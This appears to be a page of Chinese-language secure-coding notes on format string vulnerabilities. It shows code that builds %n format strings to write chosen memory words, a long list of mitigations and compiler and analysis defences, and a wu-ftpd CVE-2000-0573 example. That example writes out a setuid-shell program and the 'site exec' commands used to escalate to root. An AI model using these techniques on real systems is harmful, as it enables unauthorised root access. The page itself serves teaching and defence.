      <span class="o">&amp;</span><span class="n">k</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">j</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span>
    <span class="p">);</span>          <span class="c1">//output "    5    6    7" (其中5，6，7的宽度都是5)</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"i = %d, j = %d, k = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="p">);</span> <span class="c1">//output "i = 5, j = 10, k = 15"</span>
</code></pre></div></li>
<li>参数存取内存写
    <div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">already_written</span><span class="p">,</span> <span class="n">width_field</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">write_word</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">char</span> <span class="n">convert_spec</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="n">already_written</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>

<span class="c1">// first word</span>
<span class="n">write_word</span> <span class="o">=</span> <span class="mh">0x9020</span><span class="p">;</span>
<span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x10000</span><span class="p">;</span>

<span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_word</span><span class="o">-</span><span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="hll"><span class="n">sprintf</span><span class="p">(</span><span class="n">convert_spec</span><span class="p">,</span> <span class="s">"%%4$%du%%5$n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
</span><span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="n">convert_spec</span><span class="p">);</span>

<span class="c1">// last word</span>
<span class="n">already_written</span> <span class="o">+=</span> <span class="n">width_field</span><span class="p">;</span>
<span class="n">write_word</span> <span class="o">=</span> <span class="mh">0x0804</span><span class="p">;</span>
<span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x10000</span><span class="p">;</span>

<span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_word</span><span class="o">-</span><span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="hll"><span class="n">sprintf</span><span class="p">(</span><span class="n">convert_spec</span><span class="p">,</span> <span class="s">"%%6$%du%%7$n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
</span><span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="n">convert_spec</span><span class="p">)</span>
</code></pre></div></li>
</ul>
<h2 id="_9">缓解策略<a class="headerlink" href="#_9" title="Permanent link">¶</a></h2>
<div class="tabbed-set tabbed-alternate" data-tabs="5:12"><input checked="checked" id="__tabbed_5_1" name="__tabbed_5" type="radio"><input id="__tabbed_5_2" name="__tabbed_5" type="radio"><input id="__tabbed_5_3" name="__tabbed_5" type="radio"><input id="__tabbed_5_4" name="__tabbed_5" type="radio"/><input id="__tabbed_5_5" name="__tabbed_5" type="radio"/><input id="__tabbed_5_6" name="__tabbed_5" type="radio"/><input id="__tabbed_5_7" name="__tabbed_5" type="radio"/><input id="__tabbed_5_8" name="__tabbed_5" type="radio"/><input id="__tabbed_5_9" name="__tabbed_5" type="radio"/><input id="__tabbed_5_10" name="__tabbed_5" type="radio"/><input id="__tabbed_5_11" name="__tabbed_5" type="radio"/><input id="__tabbed_5_12" name="__tabbed_5" type="radio"/><div class="tabbed-labels"><label for="__tabbed_5_1">动态格式字符串</label><label for="__tabbed_5_2">限制字节写入</label><label for="__tabbed_5_3">使用更安全版本的格式化输出库函数</label><label for="__tabbed_5_4">测试</label><label for="__tabbed_5_5">GNU C编译器选项</label><label for="__tabbed_5_6">词法分析</label><label for="__tabbed_5_7">静态污点分析</label><label for="__tabbed_5_8">调整变参函数的实现</label><label for="__tabbed_5_9">Exec Shield</label><label for="__tabbed_5_10">FormatGuard</label><label for="__tabbed_5_11">Libsafe</label><label for="__tabbed_5_12">静态二进制分析</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="s">"%d * %d = "</span><span class="p">;</span>

    <span class="n">x</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">y</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="s">"hex"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</div>
<div class="tabbed-block">
<ul>
<li>指定一个精度域作为<code>%s</code>转换规范的一部分，如使用<code>sprintf(buffer, "Wrong command: %.495s\n", user)</code>而不是<code>sprintf(buffer, "Wrong command: %s\n", user)</code><ul>
<li>静态字符串“贡献”了17个字节</li>
<li>精度域为495确保结果字符串可以适合于512字节的缓冲</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>即函数名带n和_s的版本，它们不容易产生缓冲区溢出问题</li>
<li>这些函数指定了写入的最大字节数（包括末尾的空字节在内）</li>
<li>GNU扩展函数：<code>asprintf()</code>和<code>vasprintf()</code><ul>
<li>为字符串分配足够大的空间以容纳包括末尾空字符在内的输出内容，并通过第一个参数返回指向它的指针</li>
</ul>
</li>
<li>C++程序员：<code>iostream</code><ul>
<li>格式化输出：<code>&lt;&lt;</code></li>
<li>格式化输入：<code>&gt;&gt;</code></li>
<li>标准I/O流：<code>cin</code>、<code>cout</code>和<code>cerr</code></li>
<li>
<p>安全地打开文件</p>
<div class="tabbed-set tabbed-alternate" data-tabs="6:2"><input checked="checked" id="__tabbed_6_1" name="__tabbed_6" type="radio"/><input id="__tabbed_6_2" name="__tabbed_6" type="radio"/><div class="tabbed-labels"><label for="__tabbed_6_1"><code>iostream</code>(安全)</label><label for="__tabbed_6_2"><code>stdio</code>(不安全)</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<div class="highlight"><pre><span></span><code><span class="hll"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
</span><span class="cp">#include</span> <span class="cpf">&lt;fstream&gt;</span><span class="cp"></span>
<span class="k">using</span> <span class="k">namespace</span> <span class="nn">std</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="n">string</span> <span class="n">filename</span><span class="p">;</span>
    <span class="n">ifstream</span> <span class="n">ifs</span><span class="p">;</span>
    <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">filename</span><span class="p">;</span>
    <span class="n">ifs</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ifs</span><span class="p">.</span><span class="n">fail</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Error opening "</span> <span class="o">&lt;&lt;</span> <span class="n">filename</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">ifs</span><span class="p">.</span><span class="n">close</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>
</div>
<div class="tabbed-block">
<div class="highlight"><pre><span></span><code><span class="hll"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="n">fscanf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span> <span class="cm">/* read only */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sprintf</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"Error opening file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</div>
</div>
</div>
</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>格式字符串bug的主要来源在于错误报告代码，往往被遗漏</li>
</ul>
</div>
<div class="tabbed-block">
<div class="tabbed-set tabbed-alternate" data-tabs="7:3"><input checked="checked" id="__tabbed_7_1" name="__tabbed_7" type="radio"/><input id="__tabbed_7_2" name="__tabbed_7" type="radio"/><input id="__tabbed_7_3" name="__tabbed_7" type="radio"/><div class="tabbed-labels"><label for="__tabbed_7_1"><code>-Wformat</code></label><label for="__tabbed_7_2"><code>Wformat-nonliteral</code></label><label for="__tabbed_7_3"><code>Wformat-security</code></label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<ul>
<li>指示GCC编译器：<ol>
<li>检查对格式化输出函数的调用</li>
<li>检查格式字符串</li>
<li>验证所提供的参数的类型和数目都是正确的</li>
</ol>
</li>
<li>不会报告带符号／无符号整数转换指示符与它们相应的参数之间不匹配的情况</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>在格式字符串不是字符串字面量并且不能被校验的情况下增加了警告功能<ul>
<li>当格式化函数的格式参数为<code>va_list</code>时除外</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>增加了对于可能造成安全问题的格式化输出函数调用的警告功能</li>
</ul>
</div>
</div>
</div>
</div>
<div class="tabbed-block">
<ul>
<li>pscan<ul>
<li>自动扫描源代码中存在的格式字符串漏洞</li>
<li>如果函数最后一个参数是格式字符串且不是静态字符串，则产生一个报告</li>
<li>无法侦测传入参数时存在的漏洞</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>Shankar描述了一个用于检测C程序中的格式字符串安全漏洞的系统，该系统使用了一个基于约束的类型推断引擎</li>
<li>
<p>使用污点修饰符<code>tainted</code>，例如有下列标注：
    <div class="highlight"><pre><span></span><code><span class="n">tainted</span> <span class="kt">int</span> <span class="n">getchar</span><span class="p">();</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">tainted</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</code></pre></div></p>
<ul>
<li>则<code>getchar()</code>的返回值和程序的命令行参数都被标记为污点并作为污点值对待</li>
<li>任何污点类型的表达式被用作了格式字符串，则用户将会被警告程序中存在潜在的漏洞</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<div class="highlight"><pre><span></span><code><span class="hll"><span class="cp">#define va_start(ap,v) (ap=(va_list)_ADDRESSOF(v)+_INTSIZEOF(v)); \</span>
</span><span class="hll"><span class="cp">int va_count = va_arg(ap, int)</span>
</span><span class="hll"><span class="cp">#define va_arg(ap,t) \</span>
</span><span class="hll"><span class="cp">(*(t *)((ap+=_INTSIZEOF(t))-_INTSIZEOF(t))); \</span>
</span><span class="hll"><span class="cp">if (va_count-- == 0) abort();</span>
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">av</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>
    <span class="n">av</span> <span class="o">=</span> <span class="n">average</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">-1</span><span class="p">);</span>  <span class="c1">// works</span>
    <span class="n">av</span> <span class="o">=</span> <span class="n">average</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>  <span class="c1">// fails</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</div>
<div class="tabbed-block">
<ul>
<li>针对Linux IA-32，基于核心的安全特征</li>
<li>栈指针增加一个随机值</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>通过插入代码实现动态检测，并且拒绝那些参数个数与转换规范所指定个数不匹配的格式化输出函数调用</li>
<li>如果格式字符串使用的参数大于提供的实参，那么包装器函数将引发一个警报并终止进程</li>
<li>如果攻击者使用的格式字符串能够匹配格式化输出函数的实参个数，那么FormatGuard将不能察觉到这种攻击</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>可以阻止企图覆写栈返回地址的格式字符串漏洞和利用(2.0版本)</li>
<li>以共享库的形式实现并且先于标准库载入内存</li>
<li>检查：<ol>
<li><code>%n</code>对应的参数是否引用了一个栈帧所引用的地址。</li>
<li>确定参数的初始地址是否和最终地址位于同一栈帧内。</li>
</ol>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>如果<code>printf()</code>只有一个参数并且该参数可变，那么这个调用也许就表示有可利用的漏洞存在</li>
<li>检查函数的参数修正值（类似于<code>add esp,4</code>）</li>
</ul>
</div>
</div>
</input></input></input></div>
<h2 id="_10">漏洞实例<a class="headerlink" href="#_10" title="Permanent link">¶</a></h2>
<ul>
<li>
<p>Wu-ftpd(CVE-2000-0573)</p>
<ul>
<li>wu-ftpd 2.6.1之前版本的<code>insite_exec()</code>函数中存在一个格式字符串漏洞</li>
<li>
<p>site exec的参数未经验证，可能导致任意命令执行，用户可能会利用命令达到权限提升的目的</p>
<div class="highlight"><pre><span></span><code><span class="cm">/* duh.c */</span>
<span class="n">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
   <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
   <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cp /bin/sh ./sh"</span><span class="p">);</span>
   <span class="n">system</span><span class="p">(</span><span class="s">"/bin/chmod 6755 ./sh"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>$ make duh
$ ftp -n localhost
user: &lt;userid&gt;
password: &lt;passwd&gt;
<span class="hll">ftp&gt; quote site <span class="nb">exec</span> bash -c id
</span><span class="c1"># if vulnerable, 'uid=0, gid=0, euid=&lt;yourid&gt;, egid=&lt;your-gids&gt;' will be given</span>
<span class="hll">ftp&gt; quote site <span class="nb">exec</span> bash -c duh <span class="c1"># 前述duh.c</span>
</span>ftp&gt; quit
$ ./sh
<span class="c1">#bash   # 原来可能不够权限运行shell，现在权限提升了，可以运行了</span>
</code></pre></div>
</li>
</ul>
</li>
<li>
<p>CDE ToolTalk(CVE-2001-0717)</p>
<ul>
<li>在所有版本的CDE ToolTalk RPC数据库服务器上都存在一个可被远程利用的格式字符串漏洞</li>
</ul>
</li>
</ul>
<div class="footnote">
<hr/>
<ol>
<li id="fn:1">
<p>转换规范的参考资料：<a href="https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=vs-2019">https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=vs-2019</a> <a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
<hr/>
<div class="md-source-date">
<small>
    
      最后更新: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2021年10月14日 18:08:17</span>
<br/>创建日期: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2021年10月14日 18:08:17</span>
</small>
</div>
<!--PC和WAP自适应版-->
<div id="SOHUCS"></div>
<script type="text/javascript">
(function(){
var appid = 'cyv3MjUJQ';
var conf = 'prod_d08aaf31e597afb4c33a6f251c4356db';
var width = window.innerWidth || document.documentElement.clientWidth;
if (width < 960) {
var head = document.getElementsByTagName('head')[0]||document.head||document.documentElement;
var script = document.createElement('script');
script.type = 'text/javascript';
script.charset = 'utf-8';
script.id = 'changyan_mobile_js';
script.src = 'https://cy-cdn.kuaizhan.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf;
head.appendChild(script);
} else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://cy-cdn.kuaizhan.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
</article>
</div>
</div>
<a class="md-top md-icon" data-md-component="top" data-md-state="hidden" href="#">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path></svg>
            Back to top
          </a>
</main>
<footer class="md-footer">
<nav aria-label="Footer" class="md-footer__inner md-grid">
<a aria-label="上一页: 整数安全" class="md-footer__link md-footer__link--prev" href="integer-security.html" rel="prev">
<div class="md-footer__button md-icon">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"></path></svg>
</div>
<div class="md-footer__title">
<div class="md-ellipsis">
<span class="md-footer__direction">
                上一页
              </span>
              整数安全
            </div>
</div>
</a>
<a aria-label="下一页: 并发" class="md-footer__link md-footer__link--next" href="concurrency.html" rel="next">
<div class="md-footer__title">
<div class="md-ellipsis">
<span class="md-footer__direction">
                下一页
              </span>
              并发
            </div>
</div>
<div class="md-footer__button md-icon">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"></path></svg>
</div>
</a>
</nav>
<div class="md-footer-meta md-typeset">
<div class="md-footer-meta__inner md-grid">
<div class="md-footer-copyright">
<div class="md-footer-copyright__highlight">
            copyright © Jason Ren 2019-2021 (<a href="https://www.fantasyroom.cn" target="_blank">fantasyroom</a>) . All rights reserved
          </div>
        
        
          Made with
          <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
            Material for MkDocs
          </a>
</div>
<div class="md-footer-social">
<a class="md-footer-social__link" href="https://github.com/jasonren0403" rel="noopener" target="_blank" title="Jason's Github">
<svg viewbox="0 0 480 512" xmlns="http://www.w3.org/2000/svg"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"></path></svg>
</a>
<a class="md-footer-social__link" href="http://wpa.qq.com/msgrd?v=3&amp;uin=727847763&amp;site=qq&amp;menu=yes" rel="noopener" target="_blank" title="在QQ私聊我">
<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M433.754 420.445c-11.526 1.393-44.86-52.741-44.86-52.741 0 31.345-16.136 72.247-51.051 101.786 16.842 5.192 54.843 19.167 45.803 34.421-7.316 12.343-125.51 7.881-159.632 4.037-34.122 3.844-152.316 8.306-159.632-4.037-9.045-15.25 28.918-29.214 45.783-34.415-34.92-29.539-51.059-70.445-51.059-101.792 0 0-33.334 54.134-44.859 52.741-5.37-.65-12.424-29.644 9.347-99.704 10.261-33.024 21.995-60.478 40.144-105.779C60.683 98.063 108.982.006 224 0c113.737.006 163.156 96.133 160.264 214.963 18.118 45.223 29.912 72.85 40.144 105.778 21.768 70.06 14.716 99.053 9.346 99.704z"></path></svg>
</a>
<a class="md-footer-social__link" href="https://twitter.com/theRealRev270" rel="noopener" target="_blank" title="J.R on twitter">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg>
</a>
<a class="md-footer-social__link" href="https://www.facebook.com/renjason1999" rel="noopener" target="_blank" title="My facebook page">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg>
</a>
<a class="md-footer-social__link" href="https://discord.gg/s33UBWEPxb" rel="noopener" target="_blank" title="Join to my discussion(discord)">
<svg viewbox="0 0 640 512" xmlns="http://www.w3.org/2000/svg"><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485.065 485.065 0 0 0 404.081 32.03a1.816 1.816 0 0 0-1.923.91 337.461 337.461 0 0 0-14.9 30.6 447.848 447.848 0 0 0-134.426 0 309.541 309.541 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.689 483.689 0 0 0-119.688 37.107 1.712 1.712 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.016 2.016 0 0 0 .765 1.375 487.666 487.666 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348.2 348.2 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321.173 321.173 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251.047 251.047 0 0 0 9.109-7.137 1.819 1.819 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.812 1.812 0 0 1 1.924.233 234.533 234.533 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.407 301.407 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391.055 391.055 0 0 0 30.014 48.815 1.864 1.864 0 0 0 2.063.7A486.048 486.048 0 0 0 610.7 405.729a1.882 1.882 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541zM222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241zm195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241z"></path></svg>
</a>
</div>
</div>
</div>
</footer>
</div>
<div class="md-dialog" data-md-component="dialog">
<div class="md-dialog__inner md-typeset"></div>
</div>
<script id="__config" type="application/json">{"base": "..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.expand", "header.autohide", "toc.integrate", "search.suggest", "search.highlight", "search.share", "content.code.annotate"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../assets/javascripts/workers/search.8397ff9e.min.js", "version": null}</script>
<script src="../assets/javascripts/bundle.f89c2efe.min.js"></script>
<script src="../assets/javascripts/mermaid.min.js"></script>
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script src="https://cdn.jsdelivr.net/npm/tablesort@5.2.1/src/tablesort.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
<script src="../assets/javascripts/doc_addins.js"></script>
